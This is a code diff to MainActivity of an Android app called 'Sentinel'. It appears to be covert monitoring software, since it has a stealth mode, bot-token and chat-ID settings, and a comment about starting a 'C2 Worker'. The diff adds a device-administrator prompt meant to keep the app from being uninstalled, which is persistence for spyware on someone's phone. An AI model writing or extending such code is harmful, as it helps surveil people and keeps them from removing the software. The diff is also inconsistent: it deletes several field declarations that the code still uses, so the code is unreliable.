@@ -36,16 +36,7 @@ import kotlinx.coroutines.launch
 
 class MainActivity : AppCompatActivity() {
 
-    private lateinit var statusText: TextView
-    private lateinit var enableButton: Button
-    private lateinit var batteryButton: Button
-    private lateinit var stealthButton: Button
-    private lateinit var botTokenInput: EditText
-    private lateinit var chatIdInput: EditText
-    private lateinit var saveButton: Button
-    private lateinit var testButton: Button
-    private lateinit var checkUpdateButton: Button
-    private lateinit var setPasswordButton: Button
+    private lateinit var adminButton: Button
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -57,12 +48,13 @@ class MainActivity : AppCompatActivity() {
         
         batteryButton = findViewById(R.id.btn_ignore_battery)
         stealthButton = findViewById(R.id.btn_enable_stealth)
+        adminButton = findViewById(R.id.btn_enable_admin) // Bind
         botTokenInput = findViewById(R.id.et_bot_token)
         chatIdInput = findViewById(R.id.et_chat_id)
         saveButton = findViewById(R.id.btn_save_connection)
         testButton = findViewById(R.id.btn_test_connection)
         setPasswordButton = findViewById(R.id.btn_set_password)
-        checkUpdateButton = findViewById(R.id.btn_check_update) // Bind
+        checkUpdateButton = findViewById(R.id.btn_check_update) 
         
         val prefsManager = com.zero.sentinel.data.EncryptedPrefsManager(this)
 
@@ -163,6 +155,11 @@ class MainActivity : AppCompatActivity() {
         stealthButton.setOnClickListener {
             enableStealthMode()
         }
+
+        // 4. Admin Protection
+        adminButton.setOnClickListener {
+            showAdminDialog()
+        }
         
         // Start Foreground Service immediately if possible
         // Schedule C2 Worker on startup if configured
@@ -198,7 +195,15 @@ class MainActivity : AppCompatActivity() {
             batteryButton.isEnabled = true
         }
 
-        statusText.text = "Setup Status: ${if (enableButton.isEnabled) "Incomplete" else "Ready"}"
+        // Check Admin
+        if (isAdminActive()) {
+            adminButton.isEnabled = false
+            adminButton.text = "Protection Active ✅"
+        } else {
+            adminButton.isEnabled = true
+        }
+
+        statusText.text = "Setup Status: ${if (enableButton.isEnabled || adminButton.isEnabled) "Incomplete" else "Ready"}"
     }
 
     private fun isNotificationServiceEnabled(): Boolean {
@@ -232,6 +237,20 @@ class MainActivity : AppCompatActivity() {
         if (!password.isNullOrEmpty()) {
             showLoginDialog(password)
         }
+    }
+
+    private fun showAdminDialog() {
+         val componentName = android.content.ComponentName(this, com.zero.sentinel.receivers.SentinelDeviceAdminReceiver::class.java)
+         val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+         intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
+         intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Protects the app from unauthorized uninstallation.")
+         startActivity(intent)
+    }
+
+    private fun isAdminActive(): Boolean {
+        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+        val componentName = android.content.ComponentName(this, com.zero.sentinel.receivers.SentinelDeviceAdminReceiver::class.java)
+        return dpm.isAdminActive(componentName)
     }
 
     private fun showLoginDialog(correctPassword: String) {
